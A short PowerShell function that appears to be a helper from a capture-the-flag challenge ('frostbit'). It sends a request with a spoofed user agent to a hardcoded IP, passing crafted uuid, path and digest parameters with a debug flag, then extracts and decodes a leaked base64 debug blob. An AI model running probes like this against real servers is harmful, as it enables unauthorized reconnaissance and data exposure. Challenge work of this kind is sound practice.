```
function frostbit_test_2 {
    param(
        [Parameter()]
        [string]$uuid,
        
        [Parameter()]
        [string]$digest,
        
        [Parameter()]
        [string]$path
    )

    $session = New-Object Microsoft.PowerShell.Commands.WebRequestSession
    $session.UserAgent = "Go-http-client/1.1"

    try {
        $response = Invoke-WebRequest "https://34.173.241.47/view/$prefix$path/$uuid/status?digest=$digest&debug=1"
       
        # Extract base64 between markers
        if ($response.Content -match 'const debugData = "([^"]+)";') {
            $base64 = $matches[1]
            Write-Host "Base64:`n"
            Write-Host $base64
            Write-Host "`n"
            Write-Host "Decoded:`n"
            $decoded = [System.Convert]::FromBase64String($base64)
            $utf_decoded = [System.Text.Encoding]::UTF8.GetString($decoded)
            Write-Host $utf_decoded
        }
        
    } catch {
        Write-Host "Error:"
        Write-Host $_.ErrorDetails.Message
    }
}

# frostbit_test_2 -uuid 'c013b20d-c25c-4f58-97b5-2d114f8476fb' -path 'ZJAs0rHpbZUbWeK4jTmQ' -digest '00c080500580c8081080a55007004008'

```